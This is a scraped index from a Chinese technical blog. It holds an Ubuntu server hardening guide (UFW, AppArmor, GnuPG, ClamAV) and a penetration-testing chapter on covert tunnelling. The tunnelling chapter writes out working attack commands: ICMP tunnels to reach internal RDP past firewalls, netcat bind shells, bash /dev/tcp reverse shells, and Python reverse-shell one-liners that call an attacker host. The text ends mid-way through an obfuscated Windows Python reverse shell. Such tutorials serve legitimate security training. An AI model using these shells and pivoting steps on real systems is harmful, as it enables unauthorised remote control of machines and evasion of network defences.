使用sudo设置密码时 不受密码规则限制 # 编辑配置文件 sudo vi /etc/pam.d/common-password password [success=1 default=ignore] pam_unix.so obscure sha512 minlen=8 lcredit=1 ucredit=1 dcredit=2 ocredit=1 # minlen 最小长度 # lcredit 最少包含的小写字母个数 # ucredit 最少包含的大写字母个数 # dcredit 最少包含的数字个数 # ocredit 最少包含的其他字符个数 密码过期 sudo chage -l username # 查看用户帐号 # 设置密码过期时间 sudo chage -E 01/31/2015 -m 5 -M 90 -I 30 -W 14 username # -E 密码过期时间 # -m / -M 密码使用期限 # -I 密码过期后多少天仍可以改密码，过期锁定帐号 # -W 过期前多少天警告 帐号SSH登录 应用和服务使用其他身份认证机制，需要单独配置帐号安全 锁定帐号无法是无法组织公钥认证的SSH远程登录用户 # 删除 .ssh目录 ~/.ssh/authorized_keys 禁用帐号不会强制断开已经建立的SSH连接 who |grep username # 查询用户 pt/num 终端 sudo pkill -f pts/num # 强制踢掉 指定可SSH远程登录的用户 sudo vi /etc/ssh/sshd_config # 需重启服务生效 AllowGroups sshlogin # 设置允许的组 # 创建ssh登录组，创建属于sshlogin组的用户 sudo addgroup sshlogin \u0026\u0026 sudo adduser username sshlogin 控制台安全 # 一般，启用机器后，到了登录界面，不用登录即可进行远程连接，其他服务也尅启动了 # 避免误触，建议禁用ctrl+Alt+Delete 快捷键重启 sudo systemctl mask ctrl-alt-del.target sudo systemctl daemon-reload ","date":"2020-05-20","objectID":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/:1:0","tags":["ubuntu","UFW","文件加密","AppArmor","ClamAV"],"title":"ubuntu server-安全相关设置","uri":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/"},{"categories":["Linux"],"content":"系统信息 当前登录帐号 # 查看登录会话 w # TTY1 是本地登录，pts/0 是远程终端 # 字段： 用户-终端-来源-登录时间-发呆时间(空闲)---当前正在运行的程序 xps@xps:~$ w 08:51:23 up 1:15, 3 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT xps tty1 - 08:49 1:47 0.09s 0.04s -bash xps pts/0 192.168.0.115 07:37 1.00s 0.23s 0.01s w xps pts/1 192.168.0.115 08:49 3.00s 0.07s 0.03s vim 1.txt 历史登录信息 last -d # 从下往上看 #xps pts/0 bogon Tue May 19 07:37 still logged in #reboot system boot 4.15.0-99-generi Tue May 19 07:36 still running # 系统启动之后，就会显示reboot的一条记录，显示内核信息 lsof命令 Linux中一切皆文件，运行中的文件成为进程 目录中被打开的文件 sudo lsof +D /home/xps lsof |grep /var/log/ #查看/var/log/下的文件被哪些进程打开 用户打开的所有文件 sudo lsof -u xps sudo lsof -u ^xps # 除了xps账户之外 lsof -u 0 #查看uid为0的用户打开的文件（uid为0代表是root） 结束指定用户的所有进程 sudo kill -p `lsof -t -u xps` # -t提取pid值 列出所有的网络连接 sudo lsof -i # 类似 ss 命令 lsof -i:22 #查看22端口都有哪些进程在访问 lsof -p 1168 #查看1168进程号所打开的文件 lsof -c sshd #查看sshd服务打开的文件 其他 ## 利用lsof恢复已删除文件(日志被删除后可以这样) lsof |grep /var/log/messages #以meaages日志为例,查看状态，记住编号id cd /proc/xx_刚才的id/fd ls -l suid /sgid的安全隐患 # suid 在在user的x位置多了个S。在用户执行该程序时,用户的权限度是该程序文件属主的权限。 # sgid与suid类似，只是执行程序时获得的是文件属组的权限。 # 如果suid的属主为root，那任何人都可以root权限执行命令，危害太大 # 找启用了suid的文件 sudo find / -type f -perm -u=s -ls # 如果有不应该有suid文件，需要注意 # 找启用了guid的文件 sudo find / -type f -perm -g=s -ls # 如果员工离职，那员工的账户没被清理，被新人所沿用，就可以读取之前的文件--\u003e因为系统靠uid识别 # 检查无属主和无属组的，根据需要保存和清理(如：离职员工帐号被删除，的文件) find -xdev \\(-nouser -o nogroup \\) -print # 题外话： 当t出现在其他组的x权限位置时，表示其他组具有SBIT的权限。 SBIT（Sticky Bit）目前只针对目录有效，对于目录的作用是：当用户在该目录下建立文件或目录时，仅有自己与 root才有权力删除。 最具有代表的就是/tmp目录，任何人都可以在/tmp内增加、修改文件（因为权限全是rwx），但仅有该文件/目录建立者与 root能够删除自己的目录或文件。 ","date":"2020-05-20","objectID":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/:2:0","tags":["ubuntu","UFW","文件加密","AppArmor","ClamAV"],"title":"ubuntu server-安全相关设置","uri":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/"},{"categories":["Linux"],"content":"文件加密 网络本身不加密 通过不受信网络连接上网 加密信息传输通道是首选方案(VPN) 传输单个文件可使用文件级加密 很多应用也不加密 传输机密信息使用SSH、SCP GnuPG # 基于文件的加密。免费开源 # Linux默认安装 # 斯诺登推荐 ### 使用 # 1.生成密钥对(公钥，私钥)，发送方和接收方都要生成 gpg --gen-key #输入name,email,密码文(保护密钥) #会自动进行系统信息搜集生成随机数据(越随机越安全，如果半天没响应，执行下面的命令) #生成随机操作 熵(促使) sudo find / -type f|xargs grep somerandomstring\u003e /dev/null # 2.公钥交换:接收者先把公钥发给发送者(这里使用原始的方式) #2.1 接收者导出公钥文件 gpg --export user2_name \u003e user2_name.pub #2.2 公钥文件拷贝给发送者 scp mygpg.pub xps1@192.168.0.11:~/ # 3.发送者执行 #3.1查看当前都有哪些密钥 gpg --list-keys #3.2发送者导入接收者的公钥 gpg --import user2_name.pub #查看当前都有哪些密钥 gpg --list-keys # 4.发送者开始加密文件（-recipient 是接收者的名字） gpg --encrypt --recipient zhangsan secert.txt # secert.txt是要加密的文件 #5.加密文件发送给接收者 #接收者解密(使用私钥) gpg --output result.txt --decrypt secret.txt.gpg #输入私钥的加密密码串 ## 其他命令 #查看当前都有哪些密钥 gpg --list-keys #删除某人的公钥 gpg --delete-keys zhangsan #删除自己的私钥 gpg --delete-secret-keys xps ## 通过密钥服务器交换密钥(指定密钥服务器， 后面16进制0x---是id值的后8位) gpg --keyserver certserver.pgp.com --send-key 0xAABBCCDD # 我发送 gpg --keyserver certserver.pgp.com --recv-key 0xAABBCCDD # 对方获取 #但是这种方式在国内受限 GnuPG大致工作流程： ","date":"2020-05-20","objectID":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/:3:0","tags":["ubuntu","UFW","文件加密","AppArmor","ClamAV"],"title":"ubuntu server-安全相关设置","uri":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/"},{"categories":["Linux"],"content":"防火墙 访问控制设备 Linux内核包含Netfilter子系统 用于操作经过服务器的流量 实现包管理 用户空间管理工具iptables(功能强大，但是命令比较复杂) Ubuntu默认的防火墙管理工具UFW 操作简单，默认禁用 功能不全面 主要用作主机防火墙(本身就是目标，对自己加防护) UFW 适合做主机防火墙，如果做网络防火墙不是很好 基本使用 启用 sudo ufw enable # 注意：会有提示:\"可能会导致现有的连接断开,比如22\"--\u003e有默认策略 sudo ufw disable 查看状态 # 规则的顺序很重要(如果中间匹配了，就不往下匹配规则了) sudo ufw status sudo ufw status verbose # 详细展示: Logging: on (low)日志详细级别 Default: allow (incoming), allow (outgoing), deny (routed) --\u003e入站的默认允许，出战的默认禁止，若作为网络防火墙(路由)默认是禁用的 sudo ufw status numbered # 列出序号 默认规则 sudo ufw default allow|deny|reject DIRECTION(incoming/outigoing/routed) ## 两个拒绝的区别 # deny 无视，也没有响应，不告诉发起者(推荐这个，更安全，防扫描) # reject 会给发起者一个响应，告诉他 添加策略 添加规则 sudo ufw allow 22 # 不指定协议类型时，ctp和udp都开 sudo ufw allow 22/tcp # 最小化原则，只开tcp的22 sudo ufw deny 22 # ipv4的默认在上面, ipv6的默认在下面 设置方向(in ,out) sudo ufw allow in http # 默认设置入站规则 sudo ufw reject out smtp 规则描述 # 规则太多了记不清 sudo ufw reject telnet comment 'telnet is unencrypted' # 以后不用的规则就可以方面清理删除（安全管理意识很重要 --\u003e 详细文档很重要，统一管理平台:工单） 插入规则 # 指定新规则的位置是2，后面的向后顺延 sudo ufw insert 2 allow 80 删除规则 # 按照id序号删除 sudo ufw delete 3 # 按照 添加时候的规则删除 sudo ufw delete allow http 定向规则 # 5个：源ip，目的ip，源端口(很少做限制)，目的端口，通信协议 # 在2的位置插入，允许 proto协议为tcp，从1.1.1.10来的到1.1.1.9的22端口 sudo ufw insert 2 allow proto tcp from 1.1.1.10 to any port 22 sudo ufw insert 2 allow proto tcp from 1.1.1.10 to 1.1.1.9 port 22 sudo ufw insert 2 allow proto tcp from 192.168.0.0/24 to any port 22 # 使用于只允许公司内部访问 sudo ufw insert 2 allow proto tcp from 192.168.0.0/24 to 192.168.0.102 port 22 sudo ufw deny proto tcp from 2001:db8::/32 to any port 25 # IPv6 # /etc/default/ufw 启用/禁用IPv6规则(IPV6=YES) # 其他协议：ah, esp, gre, ipv6, igmp 端口名 # 前面 http 等是与端口对应的，不是随便起的，配置文件如下 /etc/services # 可以自定义 规则 sudo ufw deny in on eth0 to 224.0.0. proto igmp # 指定网卡（拒绝eth0入的方向使用igmp协议访问组播地址） sudo ufw allow in on eth0 to 224.0.0. proto gre sudo ufw allow proto tcp from any to any port 80,443,8080:8090 comment 'web' # 一段端口范围-\u003e用冒号 sudo ufw allow in on eth0 to any port 80 proto tcp 开启路由模式 # 启用路由功能 sudo vi /etc/ufw/sysctl.conf netipv4/ip_forward=1 net/ipv6/conf/default/forwarding=1 net/ipv6/conf/all/forwarding=1 # sudo sysctl -p ufw disable ufw enable 路由模式规则 # 启用路由功能(转发数据包)，先添加规则再开启路由也可 # 7个：源网卡接口，目的网卡接口，源ip，目的ip，源端口(很少做限制)，目的端口，通信协议 sudo ufw route allow in on eth1 out on eth2 # eth1网卡in的流量， eth2出的流量 sudo ufw route allow in on eth1 out on eth2 to 192.167.11 port 80 proto tcp 限制连接频率 # 尽量规避暴力破解 ufw limit ssh/tcp # 30s超过6次就deny 安全相关 UFW作为网络防火墙(先开启路由转发) IP遮盖 # sudo vi /etc/default/ufw DEFAULT_FORWARD_POLICY=\"ACCEPT\" # sudo vi /etc/ufw/sysctl.conf net/ipv4/ip_forward=1 # 启用路由功能 # sudo vi /etc/ufw/before.rules *nat # 开启nat地址转换 ：POSTROUTING ACCEPT [0:0] # 接收路由转发 -A POSTROUTING -s 10.8.0.0/8 -o enp0s3 -j MASQUERADE # 添加规则：制定来源内网网段，指定另一个有公网ip的的网卡然后进行地址转换并发出去 COMMIT # 完整语法规则 sudo ufw route allow/reject/deny/limit insert/delete/pretend in on eth0 out on eth1 from 1.1.1.1 oport 1:65535 to 2.2.2.2 port 22 proto tcp/udp/igmp/esp/ah # 如果不指定规则id位置，就默认在后面依次；pretend是依次从前面添加 小技巧 – 应用程序 # 为非标准端口的应用定义名称 # 为每个开放端口的服务程序分别定义程序配置文件 /etc/ufw/applications.d/ sudo ufw allow from 192.168.0.0/24 to any app CUPS sudo ufw app into CUPS [\u003cname\u003e] title=\u003ctitle\u003e description=\u003cdescription\u003e portd=\u003cports\u003e ports=12/udp|32|56,78:90/tcp # 竖线隔开 # 应用防火墙规则 sudo ufw app update \u003cname\u003e # 适用情景： 非标准业务的服务端口，一个应用同时绑定多个端口，业务描述也可以添加进去，修改也方便 日志功能 UFW默认不记录日志，因为占用存储空间 日志的价值在于：识别攻击、规则排错、诊断问题 # 全局开启日志，以及级别 / 关闭日志 sudo ufw logging on|off|LEVEL(LOW/medium/high/full) # 存储位置：/var/log/ufw.log # 单独为每条规则添加日志 sudo ufw allow log 22/tcp 恢复默认规则 # 系统全新安装的状态(实在搞不清才使用，会提前备份-\u003e/etc/ufw/日期命名的文件) sudo ufw reset Shorewall 适合任何网络的高级防火墙 有图形管理界面 因为iptables语法有点麻烦，不想使用 ","date":"2020-05-20","objectID":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/:4:0","tags":["ubuntu","UFW","文件加密","AppArmor","ClamAV"],"title":"ubuntu server-安全相关设置","uri":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/"},{"categories":["Linux"],"content":" AppArmor 简介 AppArmor是一个Linux安全模块 使不安全和不受信进程在受限的约束下运行 保证进程访问共享文件、行使特权、与其他进程通信 针对某一个进程层面 界面美观，操作较简单 全局强制访问控制机制(MAC) 基于LSM的额外安全功能 系统调用前，内核查询AppArmor策略，确定程序是否有权执行操作 不同与SELinux(过于庞大, 针对操作系统层面)，与用户无关，可用于限制超级用户权限（所有用户继承） 将进程限制在有限的系统资源之上 预设的控制机制，一定程度可预防未知安全漏洞（0day） Ubuntu默认的安全系统 默认已安装并加载 控制策略 基于安装路径识别程序并控制 策略保存于相应配置文件(profile)中 集合高级静态分析和基于文件/etc/apparmor.d 部分安装包自带配置文件 使用 安装额外配置文件 sudo apt install apparmor-profiles apparmor-profiles-extra # apparmor-profiles # 由上游社区管理维护的配置文件 # apparmor-profiles-extra # 由ubuntu、debian开发的配置文件 安装用户端管理工具 sudo apt install apparmor-utils 查看状态 sudo aa-status 控制模式 # enforcing 强制策略实施并记录被禁用请求 # complaining 只记录被禁请求，但不强制实施禁止 --\u003e策略调试时候用 ## 切换模式 aa-enforce # 切换为强制模式 aa-complain # 切换为包容模式 aa-disable # 禁用指定pofile(不对这个程序做限制，不loaded) aa-audit # 审计模式，= enforce + 记录成功访问的请求(并不是很常见) 当前已经加载的配置文件 /sys/kernel/security/apparmor/profiles 配置文件命令 与可执行程序结对路径相同，/ -\u003e . 软连接将最终解析到目标程序 默认配置文件 安装包携带并有效（bind9, mysql …） 安装包携带但为空（mariadb） 安装包无配置文件，额外包故障（samba） samba为例 1.安装samba服务 # sudo apt install samba samba-common apparmor-profiles sudo aa-status #/etc/apparmor.d/usr.sbin.smbd # nmbd服务也可以 2.启用强制策略 sudo aa-enforce /usr/sbin/smbd # 对smbd进行策略限制 sudo aa-status 3.重启服务 sudo systemctl restart smbd # 会发现报错无法启动服务(因为配置文件有问题) tail /vat/log/syslog # 查看系统日志，发现 apparmor=\"DENIED\"， 建议：从第一个DENIED开始往下看,一次修改一条 4.修正配置文件 sudo vi /etc/apparmor.d/usr.sbin.smbd ## 这里根据日志DENIED的内容来写（每一行都有逗号） /var/run/smbd rw, # path路径项权限 根据自己的写... capability net_admin, # capability进程权限 # 重新加载配置文件 sudo apparmor_parser -r usr.sbin.smbd # 重新加载所有配置文件 sudo systemctl reload apparmor.service # 然后重启服务，查看能不能起来，如果不能起来-\u003e继续查看日志和修改配置的步骤 sudo systemctl restart smbd sudo systemctl status smbd 。。。。。。 从头开始创建新的配置文件 不建议对所有程序都做限制，主要面向对外/接收提供网络服务相关的程序(apache, samba, 浏览器等等容易遭受攻击的) # 查看进了行网络请求，但是没有apparmor配置文件对其进行保护的程序 sudo aa-unconfined sudo aa-unconfined --paranoid # 所有关联网络端口的进程 # 这里拿mtr作为例子 aa-genprof mtr # 指定对什么程序进行配置 mtr www.baidu.com # 运行示例程序 # 继续按照提示选择 # sudo apparmor_parse -r usr.bin.mtr sudo aa-logpro # 检查日志更新配置文件 ","date":"2020-05-20","objectID":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/:5:0","tags":["ubuntu","UFW","文件加密","AppArmor","ClamAV"],"title":"ubuntu server-安全相关设置","uri":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/"},{"categories":["Linux"],"content":"防病毒 恶意软件 病毒、木马、蠕虫、远控、僵尸程序、勒索、挖矿、漏洞利用 通常防病毒和Linux不会出现在同一句话里，BUT！ 专门针对Liunx发行版的恶意软件 没有100%有效的单个杀毒软件（病毒库互补） ClamAV: 开源免费全平台 ClamAV 1.安装 sudo apt install clamav clamav-daemon # 如果只安装clamav，就不做自动监控；clamav-daemon 自动查杀 sudo apt install install libclamunrar6 # 对压缩包也查杀病毒 # 有桌面环境的话，可以安装客户端图形管理工具 2.更新病毒库 sudo systemctl stop clamav-freshclam # sudo freshclam # 会报错(因为他已经自动更新了)，可以先停止掉(上面)，再手动。也可以等待他更新完 less /var/log/clamav/freshclam.log # 可以查看日志记录 代理 sudo vi /etc/clamav/freshclam.conf HTTPProxyServer server_address HTTPPrpxyPort port_number 图形化前端工具 clamtk 3.手动扫描 # 扫描会占用系统资源，所以选择业务不是繁忙的时间来查杀 # 手动扫描的当前用户能扫描的位置 clamscan /home/xps -i -r # -r递归， -i显示 # --max-filesize 限制大小(超过大小就不会扫它)， --max-scansize最大扫多少(比如一个文件我只扫多少)， --exclude-dir排除目录 sudo clamscan --max-filesize=3999M --max-scansize=3999M --exclude-dir=/sys/* -i -r /home # 默认不具有杀毒能力，只是检测 # --remove 查到感染的文件，删除 # --bell 查到感染的文件，嘟嘟嘟提醒 # move=/tmp/VIRUS 查到感染的文件，移动到某个位置 # copy=/tmp/VIRUS 测试 wget http://www.eicar.org/download/eicar.com # 测试病毒文件,含毒，但是没破坏作用 clamscan -i -r ./ 4.扫描调度(定时任务) – 防止误杀(管理员要提前做好管理备份或者实时监视) at 13:00 tomorrow clamscan -i -r /home/xps freshclam \u003cEOF\u003e \u003cCTRL-D\u003e # 或者其他调度命令 crontab ","date":"2020-05-20","objectID":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/:6:0","tags":["ubuntu","UFW","文件加密","AppArmor","ClamAV"],"title":"ubuntu server-安全相关设置","uri":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/"},{"categories":["渗透测试"],"content":"内网第三章-隐藏隧道通信技术 ","date":"2020-05-16","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/:0:0","tags":["渗透测试","内网","隧道技术","端口转发"],"title":"内网第三章-隐藏隧道通信技术","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/"},{"categories":["渗透测试"],"content":"内网连通性判断 常用判断方法 1.ICMP协议 ping \u003cIP\u003e 2.TCP协议 nc -zv \u003cIP\u003e \u003cport\u003e 3.HTTP协议 curl ip:port 4.DNS协议 # 1. nslookup www.baidu.com vps-ip # vps-ip是dns服务器的地址 # 2. dig @vps-ip www.baidu.com ","date":"2020-05-16","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/:1:0","tags":["渗透测试","内网","隧道技术","端口转发"],"title":"内网第三章-隐藏隧道通信技术","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/"},{"categories":["渗透测试"],"content":"若流量不能直接流出 常见于企业办公网段上网的场景 查看网络链接，判断是否存在与其他机器的8080(不绝对)等类似端口的连接(可以尝试运行ping -n 1 -a \u003cip\u003e) 查看内网中是否有主机名类似于proxy的机器 查看IE浏览器的直接代理 根据pac文件的路径(可能是本地路径，也可能是远程路径)，将其下载下来并查看。 执行以下命令，利用curl工具进行确认 curl www.baidu.com # 不通 curl -x proxy-ip:port www.baidu.com # 通 ","date":"2020-05-16","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/:2:0","tags":["渗透测试","内网","隧道技术","端口转发"],"title":"内网第三章-隐藏隧道通信技术","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/"},{"categories":["渗透测试"],"content":" 网络层隧道技术 IPv6隧道 ICMP隧道 IPv6隧道 常见工具：socat,6tunnel,nt6tunnel等 概念：通过IPv6隧道传送IPv6数据报文(把IPv6报文整体封装在IPv4数据报文中，使得IPv6报文穿过IPv4海洋，到达另一个IPv6小岛)的技术 现阶段的边界设备、防火墙甚至入侵防御系统还无法识别IPv6的通信数据，而大多数的操作系统支持IPv6，所有需要手动配置(win的网络属性中) Note：即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包 配置隧道与自动隧道的区别： 只有在执行隧道功能的节点的IPv6地址是兼容IPv4地址时，自动隧道才是可行的。在为执行隧道功能的节点分配ip地址时，如果采用的是自动隧道方法，就不需要进行设置。 配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如：DHCP/人工配置或其他IPv4的配置机制 防御： 了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信 ICMP隧道 常见工具：icmpsh,PingTunnel,icmptunnel,powershell icmp等 比较特殊的协议，不用开放端口，最常见的ICMP消息为ping命令的回复。 将TCP/UDP数据包封装到ICMP的ping数据包中，从而穿过防火墙。 工具 1.icmpsh # 不需要管理员权限 # 简单，不存在正向反向 # 下载地址: https://github.com/inquisb/icmpsh # 本机和目标都要安装 # 安装依赖库 apt-get install python-impacket ### 使用 # 我机器执行 # 先关闭本地系统的icmp应答(恢复改为0就行) -\u003e 否则会无限刷屏 sysctl -w net.ipv4.icmp_echo_ignore_all=1 ./run.sh # 输入目标的公网ip （此文件好像不对，用下面的py文件吧） # 或者 ./icmpsh_m.py IP(公网) IP(内网的公网ip) # 这个的公网ip获取方法：ping外面，在外面抓包获取数据包的源地址 / 访问外面的地址然后查看网站访问日志等 # 目标机器执行（这里使用的win版本） icmp.exe -t 192.168.1.7 -d 500 -b 30 -s 128 # 192.168.1.7我的vps # 我的vps就会接收到反弹过来的shell 2.PingTunnel # 下载地址：http://freshmeat.sourceforge.net/projects/ptunnel/ # 貌似可以这么安装：sudo apt install ptunnel # 可跨平台使用。为了避免滥用，可为隧道设置密码 # 情景：得到的内网主机无法3389连接到数据库服务器，但是可以ping通。我们需以此机器为跳板访问另体贴数据库服务器 # 首先在两台机器都安装上此工具 ## 安装方法 #1.安装编译 tar -zxvf ... cd ... make \u0026\u0026 make install #2.如果缺少pcap.h(数据包捕获函数库),就安装 wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz tar -zxvf ... cd ... ./configure #3.如果yacc包错误，安装 sudo apt-get install -y byacc sudo apt-get install flex bison #好了之后再安装一遍 ./configure make \u0026\u0026 make install # 查看帮助信息 man pcap ## 使用方法 #4.运行PingTunnel(现在是linux上使用，也可在win上使用，只不过需要在内网的win服务器安装wincap类库) # 跳板机器(假设是已获取到的web服务器)： ptunnel -x shuteer111 # VPS上： ptunnel -p \u003c跳板_IP\u003e -lp 1080 -da \u003c另一新目标_IP\u003e -dp 3389 -x shuteer111 # 含义：在访问本地的1080端口时，会把数据库服务器(新目标)的3389数据封装在icmp隧道中，以web服务器为'ICMP隧道跳板'进行传送(窗口会显示是本地的ip，但是实际是另一台数据库服务器的) #5.在攻击机器访问本地的1080端口，成功访问到另一台数据库服务器的3389端口 参数说明： -x # 指定icmp隧道连接验证密码 -p # 指定icmp隧道另一端机器(跳板)的ip地址 -lp # 指定要监听的本地tcp端口 -da # 指定要转发的机器的ip地址 -dp # 指定要转发的机器的tcp端口 其他工具 防御方法 通过Wireshark进行ICMP数据包分析，如下： 检查同一来源的ICMP数据包的数量。一个正常的ping命令每秒最多发送两个数据包，而使用ICMP隧道的浏览器会在很短的时间内产生上千个ICMP数据包 注意那些Payload大于64bit的ICMP数据包 寻找响应数据包的Payload与请求数据包中的Payload不一致的ICMP数据包 检查ICMP数据包的协议标签。例如：icmptunnel会在所有的ICMP Payload前面添加\"TUNL\"标记来标识隧道 -\u003e 这就是特征 ","date":"2020-05-16","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/:3:0","tags":["渗透测试","内网","隧道技术","端口转发"],"title":"内网第三章-隐藏隧道通信技术","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/"},{"categories":["渗透测试"],"content":" 传输层隧道技术 传输层技术包括：TCP隧道、UDP隧道、常规端口转发等 若内网防火墙阻止了指定端口的访问，在获得目标主机权限后，可以使用iptables打开指定端口 1.lcx端口转发 两个版本： Linux 版本：portmap Widows版本：lcx.exe 一个客户端一个服务端 lcx内网端口转发 先传lcx到目标机器 #在内网目标shell上: l cx -slave 公网ip 4444 127.0.0.1 3389 # 把目标机器的3389流量转发到指定服务器(vps)指定端口 #vps服务器(我的)上执行： lcx -listen 4444 33891 # 将本地4444端口上监听的所有数据转发到本机33891端口 #然后远程桌面连接本地的33891端口即可 lcx本地端口映射 # 如果目标防火墙 限制了部分端口的数据(如3389)，可以进行端口转发：把3389端口的数据转发到防火墙允许的其他端口(如:53) # 在目标主机执行 lcx -tran 53 \u003c目标ip\u003e: 3389 linux版的portmap # 下载地址：http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip # vps ./portmap -m 2 -p1 6666 -h2 公网ip -p2 7777 # 目标内网机器 ./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网ip -p2 6666 2.netcat 安装 ## Linux # http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download #1. apt-get install netcat # 2. wget ... tar -zxvf ... cd ... ./configure make ## Windows https://joncraton.org/files/nc111nt.zip https://joncraton.org/files/nc111nt_safe.zip 参数 使用 Banner抓取 # banner可标识服务的版本等信息 # 题外话:追踪路由 mtr 114.114.114.114 ## nc作为客户端： # 参数 -v 显示详细信息 # 参数 -n 如果是域名,不进行域名解析(建议直接跟ip地址) nc -nv 1.1.1.1 110 # 连接pop3服务器，可以看到banner信息（可以进行user登录[base64编码],输入指令） nc -nv 1.1.1.1 25 # smtp服务器 nc -nv 1.1.1.1 80 # 探测80端口(都可进行交互的命令) 连接到远程主机 nc -nvv 1.1.1.1 110 端口扫描 #并非擅长端口扫描, 还慢 #参数 -z 扫描参数，只判断是否开放（默认tcp） nc -nvz 1.1.1.1 20-8080 #参数 -u 扫描udp服务的端口 （不太准确） nc -nvzu 1.1.1.1 1-1024 端口监听 nc -l -p 999 # 习惯 nc -lvvp 9999 文件传输 # 一旦连接建立，数据流就会传入，接收文件 nc -lp 333 \u003e1.txt # 发送文件内容 nc -nv 192.168.0.11 \u003c test.txt -q 1 #参数 -q: 输出完成之后过1秒就断开 简易聊天 nc -l -p 8888 nc -vn 192.168.0.11 8888 获取shell # 参考：https://www.uedbox.com/post/54632 # https://www.secpulse.com/archives/76223.html ##### nc正向shell（正向shell -\u003e 内网服务器之间） 1.目标主机监听： nc -lvvp 4444 -e /bin/bash # linux nc -lvvp 4444 -e c:\\\\WINDOWS\\system32\\cmd.exe # win 2.本机连接目标 nc 192.168.1.11 4444 ##### nc反向shell 1.本机 nc -lvvp 3333 2.目标机器执行 nc 192.168.0.111 3333 -c /bin/bash # Linux nc 192.168.0.111 -e c:\\\\WINDOWS\\system32\\cmd.exe # win ###### 如果目标主机没有nc，获取反向shell ###### 或者假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell # bash反弹shell /bin/bash -c bash -i \u003e\u0026 /dev/tcp/192.168.41.13/4444 0\u003e\u00261 # bash反弹shell(TCP) 目标机器： bash -i \u003e\u0026 /dev/tcp/192.168.41.133/4444 0\u003e\u00261 攻击方： nc -lvvp 4444 # bash反弹shell(UDP) 目标机器： bash -i \u003e\u0026 /dev/tcp/192.168.41.133/4444 0\u003e\u00261 攻击方监听： nc -u -lvp 4444 # python反向shell // 方法一 $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' // 方法二 $ export RHOST=\"127.0.0.1\";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")' # windows python反弹shell C:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for 